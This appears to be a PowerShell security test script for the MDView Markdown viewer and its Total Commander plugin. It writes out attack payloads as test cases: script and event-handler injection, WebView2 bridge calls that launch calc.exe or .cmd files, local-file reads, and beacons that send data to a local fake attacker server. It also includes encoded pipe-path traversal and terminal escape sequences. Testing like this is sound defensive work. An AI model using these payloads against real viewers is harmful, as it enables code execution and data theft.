# Security test: tries to abuse MDView through malicious Markdown documents,
# in the standalone viewer and in the Total Commander plugin.
#
# SAFE BY DESIGN:
# - Payloads only reach 127.0.0.1 (a local fake "attacker" server started
#   here) and files in a temporary attack folder. No internet, no real files.
# - "Program started" canaries are harmless: canary-*.cmd scripts that write a
#   marker file and exit, calc.exe and the calculator: protocol. Calculator
#   processes started during a case are killed afterwards. Dangerous protocol
#   handlers (ms-msdt:, search-ms:, ...) are never used.
# - The file-read target is a canary secret with a random token.
# - Downloads triggered by a case are deleted from the Downloads folder.
# - HKCU\Software\MDView is backed up and restored; test windows are stopped.
#
# Script execution is detected without the network: payloads write a marker
# (PWNED-<case>) into the page, read back through UI Automation.
#
# Usage (pwsh 7, interactive desktop; takes a few minutes):
#   .\tests\security\attack.ps1 -Exe <mdview.exe> -Dll <mdview_wlx.dll (x64)> -Label v0.2.5-before
# Writes tests\security\results\<Label>.md. Exit code = number of failed cases.
param(
    [Parameter(Mandatory)] [string]$Exe,
    [Parameter(Mandatory)] [string]$Dll,
    [Parameter(Mandatory)] [string]$Label,
    [string[]]$Only,
    [int]$Seconds = 6
)

$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName UIAutomationClient, UIAutomationTypes
$AE = [System.Windows.Automation.AutomationElement]
$Exe = (Resolve-Path $Exe).Path
$Dll = (Resolve-Path $Dll).Path
$hostScript = Join-Path $PSScriptRoot 'lister-host.ps1'
$resultsDir = Join-Path $PSScriptRoot 'results'
New-Item -ItemType Directory -Force $resultsDir | Out-Null

# ---------------------------------------------------------------- attack folder
$token = [guid]::NewGuid().ToString('N').Substring(0, 12)
$attack = Join-Path $env:TEMP "MDView-attack-$token"
New-Item -ItemType Directory $attack | Out-Null
$secretToken = "SECRET$token"
$wv2Temp = Join-Path $attack 'wv2-temp'
New-Item -ItemType Directory $wv2Temp | Out-Null
Set-Content -Path (Join-Path $attack 'secret.txt') -Value $secretToken -NoNewline

function New-Canary($case) {
    $path = Join-Path $attack "canary-$case.cmd"
    Set-Content -Path $path -Value "@echo off`r`necho ran > `"%~dp0marker-$case.txt`"`r`n" -NoNewline
    $path
}
function Test-CanaryRan($case) { Test-Path (Join-Path $attack "marker-$case.txt") }

# Virtual-origin URL of a file, as MDView maps it: https://mdview.example/<path from drive root>
function Get-VirtualUrl($path) {
    $rel = $path.Substring([IO.Path]::GetPathRoot($path).Length) -split '\\' | ForEach-Object { [Uri]::EscapeDataString($_) }
    'https://mdview.example/' + ($rel -join '/')
}
function Get-FileUrl($path) { ([Uri]$path).AbsoluteUri }

# ---------------------------------------------------------------- fake attacker server (127.0.0.1)
$tcp = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Loopback, 0)
$tcp.Start()
$port = $tcp.LocalEndpoint.Port
$hits = [System.Collections.Concurrent.ConcurrentQueue[string]]::new()
$pages = [System.Collections.Concurrent.ConcurrentDictionary[string, string]]::new()
$serverJob = Start-ThreadJob -ArgumentList $tcp, $hits, $pages, $token -ScriptBlock {
    param($tcp, $hits, $pages, $token)
    $png = [Convert]::FromBase64String('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==')
    while ($true) {
        try { $client = $tcp.AcceptTcpClient() } catch { break }
        try {
            $stream = $client.GetStream()
            $reader = [System.IO.StreamReader]::new($stream, [Text.Encoding]::ASCII, $false, 4096, $true)
            $requestLine = $reader.ReadLine()
            while (($line = $reader.ReadLine()) -ne $null -and $line -ne '') { }
            if (-not $requestLine) { continue }
            $parts = $requestLine.Split(' ')
            $method = $parts[0]; $path = $parts[1]
            $hits.Enqueue("$method $path")
            $headers = "Access-Control-Allow-Origin: *`r`nAccess-Control-Allow-Private-Network: true`r`nAccess-Control-Allow-Methods: *`r`nAccess-Control-Allow-Headers: *`r`n"
            $body = [byte[]]@(); $status = '204 No Content'; $type = 'text/plain'
            if ($method -eq 'OPTIONS') {
            } elseif ($path -like '/pixel.png*') {
                $status = '200 OK'; $type = 'image/png'; $body = $png
            } elseif ($path -like '/download*') {
                $status = '200 OK'; $type = 'text/plain'
                $headers += "Content-Disposition: attachment; filename=`"mdview-attack-$token.txt`"`r`n"
                $body = [Text.Encoding]::ASCII.GetBytes('harmless test download')
            } elseif ($path -like '/page-*') {
                $name = $path.Substring(6).Split('?')[0]
                $html = $null
                if ($pages.TryGetValue($name, [ref]$html)) {
                    $status = '200 OK'; $type = 'text/html; charset=utf-8'; $body = [Text.Encoding]::UTF8.GetBytes($html)
                }
            }
            $head = "HTTP/1.1 $status`r`nContent-Type: $type`r`nContent-Length: $($body.Length)`r`n$headers" + "Connection: close`r`n`r`n"
            $bytes = [Text.Encoding]::ASCII.GetBytes($head)
            $stream.Write($bytes, 0, $bytes.Length)
            if ($body.Length) { $stream.Write($body, 0, $body.Length) }
            $stream.Flush()
        } catch { } finally { $client.Close() }
    }
}
$srv = "http://127.0.0.1:$port"
function Get-Hits($pattern) { @($hits.ToArray() | Where-Object { $_ -like $pattern }) }

# ---------------------------------------------------------------- helpers
function Mark($case) { "document.body.insertAdjacentHTML('beforeend','<p>PWNED-$case</p>')" }

function Find-Text($root, $regex) {
    if (-not $root) { return $null }
    try {
        foreach ($e in $root.FindAll([System.Windows.Automation.TreeScope]::Descendants, [System.Windows.Automation.Condition]::TrueCondition)) {
            $n = $e.Current.Name
            if ($n -and $n -match $regex) { return $n }
        }
    } catch { }
    $null
}

function Get-ProcessWindow($proc, $title) {
    $cond = New-Object System.Windows.Automation.PropertyCondition($AE::ProcessIdProperty, $proc.Id)
    foreach ($w in $AE::RootElement.FindAll([System.Windows.Automation.TreeScope]::Children, $cond)) {
        if (-not $title -or $w.Current.Name -like $title) { return $w }
    }
    $null
}

# Message boxes (#32770) shown by the viewer; returns their text and closes them.
function Close-Dialogs($proc) {
    $found = @()
    $cond = New-Object System.Windows.Automation.PropertyCondition($AE::ProcessIdProperty, $proc.Id)
    foreach ($w in $AE::RootElement.FindAll([System.Windows.Automation.TreeScope]::Children, $cond)) {
        if ($w.Current.ClassName -ne '#32770') { continue }
        $texts = @($w.FindAll([System.Windows.Automation.TreeScope]::Descendants,
            (New-Object System.Windows.Automation.PropertyCondition($AE::ControlTypeProperty, [System.Windows.Automation.ControlType]::Text))) |
            ForEach-Object { $_.Current.Name })
        $found += ($w.Current.Name + ': ' + ($texts -join ' '))
        $buttons = $w.FindAll([System.Windows.Automation.TreeScope]::Descendants,
            (New-Object System.Windows.Automation.PropertyCondition($AE::ControlTypeProperty, [System.Windows.Automation.ControlType]::Button)))
        $pick = @($buttons | Where-Object { $_.Current.Name -match '^(No|Nee|Cancel|Annuleren|OK)$' }) | Select-Object -First 1
        if ($pick) { $pick.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern).Invoke() }
    }
    $found
}

function Invoke-Link($root, $nameRegex) {
    $links = $root.FindAll([System.Windows.Automation.TreeScope]::Descendants,
        (New-Object System.Windows.Automation.PropertyCondition($AE::ControlTypeProperty, [System.Windows.Automation.ControlType]::Hyperlink)))
    $link = @($links | Where-Object { $_.Current.Name -match $nameRegex }) | Select-Object -First 1
    if (-not $link) { return $false }
    $link.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern).Invoke()
    $true
}

function Get-PipeName($id) { "mdview-attack-$token-$id" }
# Listens on the case's named pipe until the case is over; 'CONNECTED' if
# anything opened it.
function Start-PipeListener($id) {
    $cancel = [System.Threading.CancellationTokenSource]::new()
    $job = Start-ThreadJob -ArgumentList (Get-PipeName $id), $cancel -ScriptBlock {
        param($name, $cancel)
        $s = [System.IO.Pipes.NamedPipeServerStream]::new($name, 'InOut', 8, 'Byte', 'Asynchronous')
        try { $s.WaitForConnectionAsync($cancel.Token).Wait(); 'CONNECTED' } catch { 'no connection' } finally { $s.Dispose() }
    }
    @{ Job = $job; Cancel = $cancel }
}
function Get-CalcIds { @(Get-Process -Name calc, CalculatorApp -ErrorAction SilentlyContinue | ForEach-Object Id) }
$downloads = Join-Path $env:USERPROFILE 'Downloads'

# ---------------------------------------------------------------- cases
$secretUrl = Get-VirtualUrl (Join-Path $attack 'secret.txt')
$cases = @(
    @{ Id = 'S1'; Safe = 'the script does not run'; Title = 'inline <script> runs'; Doc = "# S1`n`n<script>$(Mark 'S1')</script>" }
    @{ Id = 'S2'; Safe = 'the handler does not run'; Title = '<img onerror> handler runs'; Doc = "# S2`n`n<img src=`"missing.png`" onerror=`"$(Mark 'S2')`">" }
    @{ Id = 'S3'; Safe = 'the handler does not run'; Title = '<svg onload> handler runs'; Doc = "# S3`n`n<svg onload=`"$(Mark 'S3')`"></svg>" }
    @{ Id = 'S4'; Safe = 'the frame and its script are blocked'; Title = '<iframe srcdoc> script reaches the page'; Doc = "# S4`n`n<iframe srcdoc=`"&lt;script&gt;parent.$(Mark 'S4')&lt;/script&gt;`"></iframe>" }
    @{ Id = 'S5'; Safe = 'the viewer stays on the document; nothing is requested'; Title = '<meta refresh> navigates away'; Doc = "# S5`n`n<meta http-equiv=`"refresh`" content=`"0;url=$srv/page-S5`">" }
    @{ Id = 'S6'; Safe = 'nothing runs when the link is clicked'; Title = 'javascript: link runs when clicked'; Click = 'S6 link'; Doc = "# S6`n`n<a href=`"javascript:$(Mark 'S6')`">S6 link</a>" }
    @{ Id = 'B1'; Safe = 'the script does not run; nothing is started'; Title = 'bridge openLink starts canary.cmd next to the document'; Canary = $true; Doc = "# B1`n`n<script>chrome.webview.postMessage({type:'openLink', url: new URL('canary-B1.cmd', location.href).href})</script>" }
    @{ Id = 'B2'; Safe = 'nothing is started'; Title = 'bridge openLink starts C:\Windows\System32\calc.exe'; Calc = $true; Doc = "# B2`n`n<script>chrome.webview.postMessage({type:'openLink', url:'C:\\Windows\\System32\\calc.exe'})</script>" }
    @{ Id = 'B3'; Safe = 'nothing is started'; Title = 'bridge openLink starts a protocol handler (calculator:)'; Calc = $true; Doc = "# B3`n`n<script>chrome.webview.postMessage({type:'openLink', url:'calculator:'})</script>" }
    @{ Id = 'B4'; Safe = 'nothing is started'; Title = 'bridge openLink starts a file:/// URL'; Canary = $true; DocFn = { "# B4`n`n<script>chrome.webview.postMessage({type:'openLink', url:'$(Get-FileUrl (Join-Path $attack 'canary-B4.cmd'))'})</script>" } }
    @{ Id = 'B5'; Safe = 'the viewer stays open'; Title = 'any message containing "close" closes the viewer'; Close = $true; Doc = "# B5`n`n<script>chrome.webview.postMessage({type:'note', text:'close'})</script>" }
    @{ Id = 'B6'; Safe = 'the viewer never shows the remote page; nothing is started'; Title = 'remote page reached by script navigation uses the bridge'; Canary = $true; Page = $true; Doc = "# B6`n`n<script>location.href = '$srv/page-B6'</script>" }
    @{ Id = 'F1'; Safe = 'the file is not read'; Title = 'script reads a local file through the virtual origin'; Doc = "# F1`n`n<script>fetch('$secretUrl').then(r => r.text()).then(t => document.body.insertAdjacentHTML('beforeend', '<p>LEAK-' + t + '</p>'))</script>"; Detect = 'secret' }
    @{ Id = 'F2'; Safe = 'nothing reaches the server'; Title = 'data can be sent to a server (fetch / image / beacon / websocket / CSS)'; Doc = "# F2`n`n<div style=`"width:10px;height:10px;background:url($srv/hit?c=F2css)`"></div>`n`n<script>fetch('$srv/hit?c=F2fetch'); new Image().src = '$srv/hit?c=F2img'; navigator.sendBeacon('$srv/hit?c=F2beacon'); try { new WebSocket('ws://127.0.0.1:$port/hit?c=F2ws') } catch (e) {}</script>"; Detect = 'hits-F2' }
    @{ Id = 'F3'; Safe = 'the local .html is not shown; nothing runs or starts'; Title = 'local .html next to the document runs script with bridge access'; Canary = $true; Html = $true; Doc = "# F3`n`n<script>location.href = 'evil-F3.html'</script>" }
    @{ Id = 'N1'; Safe = 'the viewer stays on the document'; Title = 'script navigates the viewer to an external page'; Doc = "# N1`n`n<script>location.href = '$srv/page-N1'</script>"; Detect = 'hits-page-N1' }
    @{ Id = 'N2'; Safe = 'no window opens'; Title = 'window.open opens a new window'; Doc = "# N2`n`n<script>window.open('$srv/page-N2')</script>"; Detect = 'hits-page-N2' }
    @{ Id = 'N3'; Safe = 'nothing is downloaded'; Title = 'a download is saved to the Downloads folder'; Doc = "# N3`n`n<a id=`"d`" href=`"$srv/download`" download>d</a><script>document.getElementById('d').click()</script>"; Detect = 'download' }
    @{ Id = 'P1'; Safe = 'the image is not requested until the user allows it'; Title = 'remote image loads without asking (tracking pixel)'; Doc = "# P1`n`n![pixel]($srv/pixel.png?c=P1)"; Detect = 'hits-pixel' }
    @{ Id = 'U1'; Safe = 'the script is not started (a real click shows a refusal message)'; Title = 'clicking a link to a local .cmd starts it'; Canary = $true; Click = 'run the canary'; Doc = "# U1`n`n[run the canary](canary-U1.cmd)" }
    @{ Id = 'TC1'; Safe = 'the search text is only searched for, never run'; Title = 'TC search text breaks out into script'; PluginOnly = $true; Search = "x`"); $(Mark 'TC1'); (`""; Doc = "# TC1`n`nsearch target x" }
    # Paths from documents (#49): a URL must never name a path outside the
    # document's own files. Each case points at a named pipe the test listens
    # on; network files are allowed, so only the path rules can stop it.
    @{ Id = 'E1'; Safe = 'MDView does not connect to the pipe'; Title = 'image with encoded \\.\pipe\ path is opened on load'; Detect = 'pipe'; AllowNetwork = $true; Doc = "# E1`n`n![e1]($('../' * 30)%5C%5C.%5Cpipe%5C$(Get-PipeName 'E1'))" }
    @{ Id = 'E2'; Safe = 'MDView does not connect to the pipe'; Title = 'double-encoded \\.\pipe\ path is opened on load'; Detect = 'pipe'; AllowNetwork = $true; Doc = "# E2`n`n![e2]($('../' * 30)%255C%255C.%255Cpipe%255C$(Get-PipeName 'E2'))" }
    @{ Id = 'E3'; Safe = 'MDView does not connect to the pipe'; Title = 'CSS url() with encoded //./pipe/ path is opened on load'; Detect = 'pipe'; AllowNetwork = $true; Doc = "# E3`n`n<div style=`"width:10px;height:10px;background:url($('../' * 30)%2F%2F.%2Fpipe%2F$(Get-PipeName 'E3'))`"></div>" }
    @{ Id = 'E4'; Safe = 'MDView does not connect to the pipe'; Title = 'image with an absolute \\.\pipe\ or file://./pipe/ path is opened on load'; Detect = 'pipe'; AllowNetwork = $true; Doc = "# E4`n`n![e4a](\\\\.\pipe\$(Get-PipeName 'E4'))`n`n![e4b](file:////./pipe/$(Get-PipeName 'E4'))`n`n![e4c](https://unc.mdview.example/./pipe/$(Get-PipeName 'E4'))" }
    @{ Id = 'E5'; Safe = 'MDView does not connect to the pipe (a real click shows a refusal message)'; Title = 'clicking a link to file://./pipe/ opens the pipe'; Detect = 'pipe'; AllowNetwork = $true; Click = 'e5 pipe link'; Doc = "# E5`n`n[e5 pipe link](<file://./pipe/$(Get-PipeName 'E5')>)" }
)
$pages['S5'] = "<html><body>left MDView (S5)</body></html>"
$pages['N1'] = "<html><body>left MDView (N1)</body></html>"
$pages['N2'] = "<html><body>popup (N2)</body></html>"
$pages['B6'] = "<html><body><p>remote page</p><script>if (window.chrome && chrome.webview) { chrome.webview.postMessage({type:'openLink', url:'$(Get-FileUrl (Join-Path $attack 'canary-B6.cmd'))'}); document.body.insertAdjacentHTML('beforeend','<p>PWNED-B6</p>') }</script></body></html>"
Set-Content -Path (Join-Path $attack 'evil-F3.html') -Value "<html><body><p>local html</p><script>document.body.insertAdjacentHTML('beforeend','<p>PWNED-F3</p>'); if (window.chrome && chrome.webview) chrome.webview.postMessage({type:'openLink', url: new URL('canary-F3.cmd', location.href).href})</script></body></html>"

# ---------------------------------------------------------------- registry safety
$key = 'HKCU:\Software\MDView'
$regNames = 'Left', 'Top', 'Right', 'Bottom', 'ShowCmd', 'DontAskRegister', 'ZoomPercent', 'RemoteImages', 'NetworkFiles'
$regBackup = @{}
$p0 = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
foreach ($n in $regNames) { if ($p0 -and $null -ne $p0.$n) { $regBackup[$n] = $p0.$n } }
function Restore-Registry {
    if (-not (Test-Path $key)) { New-Item -Path $key | Out-Null }
    foreach ($n in $regNames) {
        if ($regBackup.ContainsKey($n)) { Set-ItemProperty -Path $key -Name $n -Value $regBackup[$n] -Type DWord }
        else { Remove-ItemProperty -Path $key -Name $n -ErrorAction SilentlyContinue }
    }
}
function Set-TestRegistry {
    Restore-Registry
    foreach ($kv in @{ Left = 200; Top = 150; Right = 1200; Bottom = 950; ShowCmd = 1; DontAskRegister = 1 }.GetEnumerator()) {
        Set-ItemProperty -Path $key -Name $kv.Key -Value $kv.Value -Type DWord
    }
}

# ---------------------------------------------------------------- runner
$results = @()
function Invoke-Case($case, $hostKind) {
    $id = $case.Id
    $doc = Join-Path $attack "case-$id.md"
    $text = if ($case.DocFn) { & $case.DocFn } else { $case.Doc }
    Set-Content -Path $doc -Value $text -NoNewline
    foreach ($c in 'B1', 'B4', 'B6', 'F3', 'U1') { if ($id -eq $c) { New-Canary $c | Out-Null } }
    Remove-Item (Join-Path $attack "marker-$id.txt") -ErrorAction SilentlyContinue
    $calcBefore = Get-CalcIds
    $hitsBefore = $hits.Count
    $dlBefore = @(Get-ChildItem $downloads -Filter "*$token*" -ErrorAction SilentlyContinue)
    Set-TestRegistry
    # Network files allowed in both programs' settings (registry; the plugin's
    # mdview.ini next to its status file), so only the path rules count.
    $pluginIni = Join-Path $attack 'mdview.ini'
    Remove-Item $pluginIni -ErrorAction SilentlyContinue
    if ($case.AllowNetwork) {
        Set-ItemProperty -Path $key -Name NetworkFiles -Value 1 -Type DWord
        Set-Content -Path $pluginIni -Value "[MDView]`r`nNetworkFiles=1`r`n" -NoNewline
    }
    $pipe = if ($case.Detect -eq 'pipe') { Start-PipeListener $id } else { $null }

    $status = $null; $statusFile = Join-Path $attack "status-$id-$hostKind.txt"
    # Own TEMP, so the viewer gets its own WebView2 data folder (%TEMP%\MDView_WebView2)
    # and never collides with an MDView or Total Commander already running.
    $savedTemp = $env:TEMP; $savedTmp = $env:TMP
    $env:TEMP = $wv2Temp; $env:TMP = $wv2Temp
    try {
        if ($hostKind -eq 'exe') {
            $proc = Start-Process -FilePath $Exe -ArgumentList '--gui', "`"$doc`"" -PassThru
        } else {
            $hostArgs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', "`"$hostScript`"", '-Dll', "`"$Dll`"", '-Doc', "`"$doc`"", '-Seconds', 90, '-StatusFile', "`"$statusFile`"")
            if ($case.Search) { $hostArgs += @('-Search', "`"$($case.Search.Replace('"', '\"'))`"") }
            $proc = Start-Process -FilePath "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList $hostArgs -PassThru -WindowStyle Hidden
        }
    } finally { $env:TEMP = $savedTemp; $env:TMP = $savedTmp }

    $deadline = (Get-Date).AddSeconds(30)
    $win = $null
    while ((Get-Date) -lt $deadline -and -not $proc.HasExited -and -not $win) {
        Start-Sleep -Milliseconds 300
        $win = if ($hostKind -eq 'exe') { $proc.Refresh(); if ($proc.MainWindowHandle -ne 0) { $AE::FromHandle($proc.MainWindowHandle) } } else { Get-ProcessWindow $proc 'Lister (mdview)*' }
    }
    # Wait until the document itself is shown (its heading is the case id), so a
    # page that has not loaded yet is never counted as "blocked". Cases that
    # navigate away at once may never show it.
    $pageLoaded = $false
    $navigatesAway = $id -in 'S5', 'B6', 'F3', 'N1'
    if ($win) {
        $deadline = (Get-Date).AddSeconds(20)
        while ((Get-Date) -lt $deadline -and -not $proc.HasExited -and -not $pageLoaded) {
            if (Find-Text $win "^$id$") { $pageLoaded = $true } else { Start-Sleep -Milliseconds 300 }
        }
    }
    Start-Sleep -Seconds 2
    $dialogs = @()
    if ($case.Click -and $win -and -not $proc.HasExited) {
        $clicked = Invoke-Link $win ([regex]::Escape($case.Click))
        Start-Sleep -Seconds 2
        if (-not $clicked) { $dialogs += '(link not found)' }
    }
    Start-Sleep -Seconds ([Math]::Max(1, $Seconds - 4))
    if (-not $proc.HasExited) { $dialogs += Close-Dialogs $proc; Start-Sleep -Milliseconds 500 }

    $marker = if ($win -and -not $proc.HasExited) { Find-Text $win "PWNED-$id|LEAK-" } else { $null }
    $exitedEarly = $proc.HasExited
    if ($hostKind -eq 'plugin' -and (Test-Path $statusFile)) { $status = Get-Content $statusFile -Raw }
    if (-not $proc.HasExited) { $proc | Stop-Process -Force; $proc.WaitForExit(5000) | Out-Null }
    Restore-Registry
    Remove-Item $pluginIni -ErrorAction SilentlyContinue
    $pipeResult = $null
    if ($pipe) { $pipe.Cancel.Cancel(); $pipeResult = Receive-Job $pipe.Job -Wait; Remove-Job $pipe.Job -Force }

    $newHits = @($hits.ToArray() | Select-Object -Skip $hitsBefore)
    $newCalc = @(Get-CalcIds | Where-Object { $calcBefore -notcontains $_ })
    foreach ($pidCalc in $newCalc) { Stop-Process -Id $pidCalc -Force -ErrorAction SilentlyContinue }
    $dlNew = @(Get-ChildItem $downloads -Filter "*$token*" -ErrorAction SilentlyContinue | Where-Object { $dlBefore.FullName -notcontains $_.FullName })
    $dlNew += @(Get-ChildItem $downloads -Filter "canary-*.cmd" -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-2) })
    foreach ($f in $dlNew) { Remove-Item -LiteralPath $f.FullName -Force -ErrorAction SilentlyContinue }

    # What happened, and did the attack work?
    $observed = @()
    $worked = $false
    if ($marker -and $marker -match "PWNED-$id") { $observed += "script ran ($marker)"; $worked = $true }
    if ($marker -and $marker -match 'LEAK-') {
        if ($marker -match $secretToken) { $observed += 'local file read by script'; $worked = $true } else { $observed += "read attempt: $marker" }
    }
    if ($case.Canary -and (Test-CanaryRan $id)) { $observed += "canary-$id.cmd was started"; $worked = $true }
    if ($case.Calc -and $newCalc.Count) { $observed += "Calculator started ($($newCalc.Count) process(es), killed)"; $worked = $true }
    if ($case.Close -and ($exitedEarly -or $status -eq 'closed-by-plugin')) { $observed += 'viewer closed by the message'; $worked = $true }
    switch -Wildcard ($case.Detect) {
        'hits-F2' { $f2 = @($newHits | Where-Object { $_ -match 'c=F2' }); if ($f2.Count) { $observed += "server received: $(($f2 | ForEach-Object { ($_ -split 'c=')[1] }) -join ', ')"; $worked = $true } }
        'hits-page-*' { $n = $case.Detect.Substring(5); if (@($newHits | Where-Object { $_ -match "/$n" }).Count) { $observed += "server page /$n was loaded"; $worked = $true } }
        'hits-pixel' { if (@($newHits | Where-Object { $_ -match '/pixel.png' }).Count) { $observed += 'remote image was requested without asking'; $worked = $true } }
        'download' { if ($dlNew.Count) { $observed += "file saved to Downloads ($($dlNew.Name -join ', '), deleted)"; $worked = $true } elseif (@($newHits | Where-Object { $_ -match '/download' }).Count) { $observed += 'download requested, not saved' } }
    }
    if ($id -in 'S5', 'B6') { if (@($newHits | Where-Object { $_ -match "/page-$id" }).Count) { $observed += "navigated to server page /page-$id"; $worked = $true } }
    if ($id -eq 'U1' -and $dlNew.Count) { $observed += 'canary saved to Downloads (deleted)'; $worked = $true }
    if ($pipeResult -eq 'CONNECTED') { $observed += "MDView connected to the named pipe $(Get-PipeName $id)"; $worked = $true }
    if ($dialogs.Count) { $observed += "dialog: $($dialogs -join ' | ')" }
    # A case that could not run is an error, never a pass.
    $notRun = $null
    if ($hostKind -eq 'plugin' -and $status -eq 'load-failed') { $notRun = 'plugin failed to load the document' }
    elseif (-not $win -and -not ($case.Close -and $exitedEarly)) { $notRun = 'viewer window not found' }
    elseif (-not $pageLoaded -and -not $navigatesAway -and -not ($case.Close -and $exitedEarly)) { $notRun = 'document did not load' }
    if (-not $observed.Count) { $observed += 'nothing happened' }

    $result = if ($worked) { 'FAIL (attack worked)' } elseif ($notRun) { "ERROR (did not run: $notRun)" } else { 'PASS (blocked)' }
    [pscustomobject]@{ Case = $id; Host = $hostKind; Attack = $case.Title; Safe = $case.Safe; Result = $result; Observed = ($observed -join '; ') }
}

try {
    foreach ($case in $cases) {
        if ($Only -and $Only -notcontains $case.Id) { continue }
        foreach ($hostKind in 'exe', 'plugin') {
            if ($case.PluginOnly -and $hostKind -eq 'exe') { continue }
            Write-Host "running $($case.Id) on $hostKind ..."
            $r = Invoke-Case $case $hostKind
            Write-Host ("  {0}: {1}" -f $r.Result, $r.Observed)
            $results += $r
        }
    }

    # T1: escape sequences from the document reach the terminal (exe --term, output to a file)
    if (-not $Only -or $Only -contains 'T1') {
        $esc = [char]27; $bel = [char]7
        $doc = Join-Path $attack 'case-T1.md'
        Set-Content -Path $doc -Value "# T1`n`nbefore $esc]0;PWNED-T1$bel after $esc]52;c;UFdORUQ=$bel end" -NoNewline -Encoding utf8
        $out = Join-Path $attack 'term-T1.out'
        $p = Start-Process -FilePath $Exe -ArgumentList '--term', "`"$doc`"" -RedirectStandardOutput $out -WindowStyle Hidden -PassThru -Wait
        $bytes = [IO.File]::ReadAllText($out)
        $raw = @()
        if ($bytes.Contains("$esc]0;PWNED-T1")) { $raw += 'OSC 0 (window title)' }
        if ($bytes.Contains("$esc]52;")) { $raw += 'OSC 52 (clipboard write)' }
        $results += [pscustomobject]@{ Case = 'T1'; Host = 'terminal'; Attack = 'escape sequences in the document reach the terminal'; Safe = 'escape sequences from the document are removed'; Result = if ($raw.Count) { 'FAIL (attack worked)' } else { 'PASS (blocked)' }; Observed = if ($raw.Count) { "written raw: $($raw -join ', ')" } else { 'control characters removed' } }
        Write-Host "T1: $($results[-1].Result)"
    }
}
finally {
    Restore-Registry
    $tcp.Stop()
    Stop-Job $serverJob -ErrorAction SilentlyContinue; Remove-Job $serverJob -Force -ErrorAction SilentlyContinue
    Get-Process mdview -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $Exe } | Stop-Process -Force -ErrorAction SilentlyContinue
}

# ---------------------------------------------------------------- report
$failed = @($results | Where-Object { $_.Result -like 'FAIL*' }).Count
$errors = @($results | Where-Object { $_.Result -like 'ERROR*' }).Count
# Table cells are shown as text: the attack descriptions contain HTML such as
# <script>, which would otherwise be rendered (and hide the rest of the table).
function Format-Cell([string]$s) {
    $s.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;').Replace('|', '\|')
}
$hostNames = @{ exe = 'standalone viewer'; plugin = 'TC plugin'; terminal = 'terminal (`--term`)' }
$lines = @(
    "# MDView security test: $Label",
    '',
    "- Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm')",
    "- Standalone viewer: ``$(Split-Path $Exe -Leaf)`` (FileVersion $((Get-Item $Exe).VersionInfo.FileVersion))",
    "- TC plugin: ``$(Split-Path $Dll -Leaf)`` (FileVersion $((Get-Item $Dll).VersionInfo.FileVersion))",
    "- **$failed of $($results.Count) attacks worked**, $errors could not run",
    '',
    '## How to read this',
    '',
    'Each row is one attack: a Markdown document written to abuse MDView, opened in the standalone viewer, in the',
    'Total Commander plugin (through a test host that loads the plugin like TC does) or rendered to the terminal.',
    'The test uses harmless stand-ins: a script that only writes a marker file, Calculator, and a local server on',
    '127.0.0.1 that plays the attacker.',
    '',
    '- **PASS**: MDView did the safe thing; the attack was blocked.',
    '- **FAIL**: the attack worked.',
    '- **ERROR**: the case could not run, so it proves nothing.',
    '',
    '| Case | Where | Attack | Safe behaviour | Result | What the test saw |',
    '|---|---|---|---|---|---|'
)
foreach ($r in $results) {
    $where = if ($hostNames.ContainsKey($r.Host)) { $hostNames[$r.Host] } else { $r.Host }
    $lines += "| $($r.Case) | $where | $(Format-Cell $r.Attack) | $(Format-Cell $r.Safe) | $($r.Result) | $(Format-Cell $r.Observed) |"
}
$report = Join-Path $resultsDir "$Label.md"
Set-Content -Path $report -Value ($lines -join "`n") -Encoding utf8
Write-Host "`nreport: $report"
Start-Sleep -Seconds 2   # WebView2 helper processes release the data folder
Remove-Item -LiteralPath $attack -Recurse -Force -ErrorAction SilentlyContinue
exit ($failed + $errors)
